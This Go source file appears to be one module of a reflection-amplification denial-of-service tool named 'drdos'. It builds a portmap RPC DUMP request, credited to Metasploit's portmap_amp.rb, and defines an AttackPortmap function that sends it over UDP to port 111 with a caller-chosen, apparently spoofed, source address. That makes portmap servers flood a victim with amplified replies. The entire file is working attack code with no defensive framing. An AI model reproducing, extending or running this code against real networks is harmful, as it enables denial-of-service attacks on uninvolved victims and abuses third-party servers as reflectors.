package drdos

import (
	"drdos/config"
	"drdos/utils"
	"math/rand"
)

/*
	v3 supported only
	get this from metasploit portmap_amp.rb
*/

var (
	portmapPayload []byte
	portmapDport   int
)

func init() {
	// 4 random bytes
	portmapDport = 111
	for i := 0; i < 4; i++ {
		portmapPayload = append(portmapPayload, byte(rand.Intn(256)))
	}
	portmapPayload = append(portmapPayload, []byte{0, 0, 0, 0}...)     // Message Type: 0 (Call)
	portmapPayload = append(portmapPayload, []byte{0, 0, 0, 2}...)     // RPC Version:2
	portmapPayload = append(portmapPayload, []byte{0, 1, 134, 160}...) // Program: Portmap (10000)
	portmapPayload = append(portmapPayload, []byte{0, 0, 0, 3}...)     // Program version: 3
	portmapPayload = append(portmapPayload, []byte{0, 0, 0, 4}...)     // Procedure: DUMP(4)
	portmapPayload = append(portmapPayload, []byte{0, 0, 0, 0}...)     // Credentials Flavor: AUTH_NULL (0)
	portmapPayload = append(portmapPayload, []byte{0, 0, 0, 0}...)     // Credentials Length: 0
	portmapPayload = append(portmapPayload, []byte{0, 0, 0, 0}...)     // Verifier Flavor: AUTH_NULL (0)
	portmapPayload = append(portmapPayload, []byte{0, 0, 0, 0}...)     // Verifier Length: 0
}

func CheckPortmap(dstip string, srcip string) error {
	return utils.SendUdpPack(dstip, srcip, portmapDport, config.ListenPort, portmapPayload)
}

func AttackPortmap(dstip string, srcip string, port int) error {
	return utils.SendUdpPack(dstip, srcip, portmapDport, port, portmapPayload)
}
